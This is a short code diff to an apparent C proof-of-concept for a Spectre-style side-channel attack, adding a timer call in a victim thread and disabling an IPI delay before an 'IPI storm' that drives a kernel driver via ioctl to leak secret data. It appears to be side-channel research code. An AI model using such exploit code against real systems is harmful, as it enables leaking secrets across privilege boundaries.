@@ -84,6 +84,7 @@ char spectre_read(char *secret, int offset)
 void victim_thread()
 {
     pin_cpu(VICTIM_CPU);
+    timer_start();
     int ret = do_ioctl(IOCTL_COMMAND_HOLD);
     //printf("ret: %d\n", ret);
     pthread_exit(0);
@@ -142,7 +143,7 @@ int main(int argc, char** argv) {
 
 
             start_victim();
-            ipi_delay(num_pid);
+           // ipi_delay(num_pid);
             
             begin_ipi_storm();
             char c = do_ioctl_data(IOCTL_COMMAND_TRANSMIT, &data);
